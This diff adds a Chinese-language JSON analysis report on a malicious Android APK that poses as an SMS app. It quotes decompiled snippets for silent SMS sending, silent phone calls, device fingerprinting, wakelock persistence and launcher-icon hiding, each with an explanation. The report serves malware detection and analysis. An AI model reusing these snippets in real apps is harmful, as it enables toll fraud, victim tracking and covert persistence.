@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "36a5cdda993c92eaa0d79acdd76c63276edfaad92b40095582dcddc44fe99109.apk",
+    "sha256": "36a5cdda993c92eaa0d79acdd76c63276edfaad92b40095582dcddc44fe99109",
+    "包名": "org.value.peasant",
+    "应用名": "СМС - Фото",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 231.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\value\\peasant\\e;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Packet.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该方法调用 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码和短信内容均由方法参数传入，全程无用户界面、无用户知情或确认，属于典型的静默短信发送行为。数据流向为：外部传入的目标号码与短信内容→SmsManager.sendTextMessage() 直接发出。结合同一样本中 AccessibilityService 自检（判断 id 是否包含 org.value.peasant，与 Zscaler 报告所述伪装成 Messages 并滥用无障碍服务的恶意行为吻合）以及设备信息（机型 Build.MODEL、系统版本、运营商名称）上报行为，该短信发送功能极可能用于短信欺诈、增值业务订阅或向 C2 指定号码发送诈骗短信，可直接造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\value\\peasant\\e;",
+          "method_signature": "d(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String d(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static String d(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static AlarmManager e(Context context) {\n          return (AlarmManager) context.getSystemService(\"alarm\");",
+          "behavior_description": "该静态方法通过 Settings.Secure.getString() 从系统安全设置数据库中读取 ANDROID_ID（设备级唯一标识符），属于典型的设备指纹采集行为。结合厂商报告确认该样本为伪装成短信应用、滥用 AccessibilityService 的间谍软件，且该代码位于混淆包名 org.value.peasant 下的工具类中（同类还封装了 AlarmManager、AccessibilityManager 等系统服务获取，与报告描述的间谍行为吻合），此 ANDROID_ID 大概率被用于唯一标识受害设备，将窃取的数据与设备绑定并上报 C2 服务器，实现受害者追踪。数据流向：Settings.Secure 系统设置数据库（source）→ 读取 ANDROID_ID 设备标识 → 被恶意程序采集用于设备指纹构建与受害者标识（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\value\\peasant\\FactorFlavor;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(a());\n} else {\n    startService(a());\n}\nthis.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Warrant\");\nthis.b.acquire();",
+          "malicious_code_snippet_context": "                  System.exit(1);\n              }\n          });\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(a());\n>>>         } else {\n>>>             startService(a());\n>>>         }\n>>>         HandlerThread handlerThread = new HandlerThread(\"Passive\");\n>>>         handlerThread.start();\n          f1a = new Handler(handlerThread.getLooper());\n          registerReceiver(new PrejudiceLoan(), b());\n          this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Warrant\");",
+          "behavior_description": "该代码位于混淆类 org.value.peasant.FactorFlavor 的 Application.onCreate() 中，App 进程一启动即根据系统版本调用 startForegroundService()/startService() 拉起核心恶意服务，随后通过 PowerManager 获取无超时的 PARTIAL_WAKE_LOCK（newWakeLock(1, \"Warrant\")）并长期持有，配合注册广播接收器（PrejudiceLoan）和后台 HandlerThread（\"Passive\"）构建多重保活机制，防止进程被系统回收。数据流向：应用启动生命周期→ 前台服务启动 + WakeLock.acquire() 持久持锁，为该样本利用 AccessibilityService 进行持续隐蔽监控提供常驻运行环境，属于间谍木马的持久化基础设施。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\value\\peasant\\ProofMobile;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Packet.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "该方法位于IntentService中，接收参数str（电话号码，来源于远程C2服务器下发并经onHandleIntent分发的指令参数），构造ACTION_CALL意图（Uri为\"tel:\"+号码），添加FLAG_ACTIVITY_NEW_TASK(268435456)标志后直接调用startActivity()发起通话。与仅调起拨号界面的ACTION_DIAL不同，ACTION_CALL会绕过用户确认直接拨打电话，属于静默拨号。方法返回0/6等状态码表明其是命令执行框架的一部分，执行结果会回传。结合该样本为Flubot类恶意软件（伪装'Сообщение/Messages'短信应用、滥用AccessibilityService隐藏自身），此代码用于按C2指令静默拨打指定号码（如高额付费号码），实施话费欺诈，直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\value\\peasant\\WolfDrawing;",
+          "method_signature": "b()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) RemindSpoil.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      private void b() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) RemindSpoil.class), 2, 1);\n      }\n  \n      private void c() {",
+          "behavior_description": "方法 b() 通过 PackageManager.setComponentEnabledSetting() 将应用自身的组件 RemindSpoil（launcher 启动 Activity）设置为禁用状态（COMPONENT_ENABLED_STATE_DISABLED=2，flag DONT_KILL_APP=1），使应用图标从桌面启动器中消失且进程不被杀死。数据流向：硬编码的组件类 RemindSpoil.class → setComponentEnabledSetting() 静默禁用启动组件。该行为发生在 startForeground 伪装通知之后，与厂商报告中该样本利用 AccessibilityService 从事间谍活动并 'hides itself in order to spy on its victims' 的描述吻合：隐藏图标是为了让用户无法发现和卸载应用，实现隐蔽驻留与持续监控，属于恶意软件典型的图标隐藏/隐蔽持久化技术。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
